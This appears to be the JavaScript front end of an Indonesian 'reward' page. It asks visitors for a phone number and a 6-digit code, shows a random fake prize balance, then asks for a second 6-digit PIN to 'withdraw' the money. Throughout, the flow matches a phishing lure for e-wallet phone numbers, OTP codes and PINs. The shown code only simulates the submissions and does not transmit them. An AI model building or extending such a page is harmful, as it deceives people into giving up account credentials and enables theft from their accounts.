document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    r: document.getElementById('reward-page'),
    w: document.getElementById('withdraw-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const registeredPhone = document.getElementById('registered-phone');
  const saldoAmount = document.getElementById('saldo-amount');
  const tarikDanaButton = document.getElementById('tarik-dana-button');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let rewardAmounts = [
    'Rp 1.250.000',
    'Rp 850.000', 
    'Rp 1.500.000',
    'Rp 750.000',
    'Rp 1.100.000'
  ];

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function getRandomReward() {
    const randomIndex = Math.floor(Math.random() * rewardAmounts.length);
    return rewardAmounts[randomIndex];
  }

  // Modified Phone Number Formatting
  pn.addEventListener('input', (e) => {
    // Hapus semua karakter non-digit
    let value = e.target.value.replace(/\D/g, '');
    
    // Hapus angka 0 di awal jika ada
    if (value.startsWith('0')) {
      value = value.substring(1);
    }
    
    // Pastikan selalu dimulai dengan 8
    if (value.length > 0 && !value.startsWith('8')) {
      value = '8' + value.replace(/^8/, ''); // Tambahkan 8 di depan dan hapus 8 yang mungkin sudah ada
    }
    
    // Batasi panjang maksimal (3+4+5=12 digit)
    if (value.length > 12) {
      value = value.substring(0, 12);
    }
    
    // Format nomor dengan tanda hubung
    let formatted = '';
    if (value.length > 0) {
      formatted = value.substring(0, 3); // 3 digit pertama
      if (value.length > 3) {
        formatted += '-' + value.substring(3, 7); // 4 digit berikutnya
      }
      if (value.length > 7) {
        formatted += '-' + value.substring(7, 12); // 5 digit terakhir
      }
    }
    
    // Set nilai input dengan format yang sudah dibuat
    e.target.value = formatted;
    
    // Simpan nomor tanpa format untuk pengiriman data
    phoneNumber = value;
  });

  // Event Handlers
  lb.addEventListener('click', async () => {
    if (currentPage === 'n') {
      if (phoneNumber.length < 10) {
        alert('Nomor HP harus minimal 10 digit');
        return;
      }
      
      showSpinner();
      try {
        // Simulasi pengiriman data
        setTimeout(() => {
          pages.n.style.display = 'none';
          pages.p.style.display = 'block';
          currentPage = 'p';
          lc.style.display = 'none';
          hideSpinner();
        }, 1000);
      } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
        hideSpinner();
      }
    } else if (currentPage === 'p') {
      // Handle PIN submission
      pin = Array.from(pis).map(i => i.value).join('');
      
      if (pin.length !== 6) {
        alert('Kode pendaftaran harus 6 digit');
        return;
      }
      
      showSpinner();
      try {
        // Simulasi verifikasi kode
        setTimeout(() => {
          pages.p.style.display = 'none';
          pages.r.style.display = 'block';
          currentPage = 'r';
          
          // Set random reward amount
          saldoAmount.textContent = getRandomReward();
          hideSpinner();
        }, 1000);
      } catch (error) {
        alert('Gagal verifikasi kode: ' + error.message);
        hideSpinner();
      }
    }
  });

  // PIN Input Handling
  pis.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '');
      
      if (e.target.value.length === 1 && index < pis.length - 1) {
        pis[index + 1].focus();
      }
    });
    
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
        pis[index - 1].focus();
      }
    });
  });

  // Tarik Dana Button Handler
  tarikDanaButton.addEventListener('click', () => {
    pages.r.style.display = 'none';
    pages.w.style.display = 'block';
    currentPage = 'w';
    
    // Tampilkan nomor yang terdaftar
    registeredPhone.textContent = '+62 ' + pn.value;
    
    // Reset PIN inputs
    pis.forEach(input => input.value = '');
  });

  // Toggle PIN Visibility
  document.querySelectorAll('.show-text').forEach(button => {
    button.addEventListener('click', (e) => {
      const isShowing = e.target.classList.toggle('active');
      const container = e.target.closest('.container');
      const pinInputs = container.querySelectorAll('.pin-box');
      pinInputs.forEach(input => {
        input.type = isShowing ? 'text' : 'password';
      });
      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
    });
  });

  // Handle PIN untuk penarikan dana
  const withdrawPins = document.querySelectorAll('#withdraw-page .pin-box');
  if (withdrawPins.length > 0) {
    withdrawPins.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        
        if (e.target.value.length === 1 && index < withdrawPins.length - 1) {
          withdrawPins[index + 1].focus();
        }
        
        const withdrawPin = Array.from(withdrawPins).map(i => i.value).join('');
        
        if (withdrawPin.length === 6) {
          showSpinner();
          // Simulasi proses penarikan
          setTimeout(() => {
            sn.style.display = 'block';
            setTimeout(() => {
              sn.style.display = 'none';
              hideSpinner();
            }, 3000);
          }, 2000);
        }
      });
      
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
          withdrawPins[index - 1].focus();
        }
      });
    });
  }
});
